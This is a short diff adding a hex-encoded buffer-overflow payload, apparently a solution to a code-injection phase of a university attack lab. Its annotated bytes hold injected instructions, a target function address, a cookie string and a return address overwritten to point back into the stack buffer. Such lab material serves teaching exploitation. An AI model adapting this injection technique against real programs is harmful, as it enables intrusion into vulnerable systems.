@@ -1,0 +1,6 @@
+48 83 ec 20 48 8d 7c 24   /* cbuff_start: exploit_code */
+08 c3 ff ff ff ff ff ff   /* cbuff_8:     exploit_code */
+fa 18 40 00 00 00 00 00   /* cbuff_16:    touch3_addr */
+35 39 62 39 39 37 66 61   /* cbuff_24:    cookie_str */
+00 00 00 00 00 00 00 00   /* cbuff_end:   empty */
+78 dc 61 55 00 00 00 00   /* return_addr: cbuff_start */
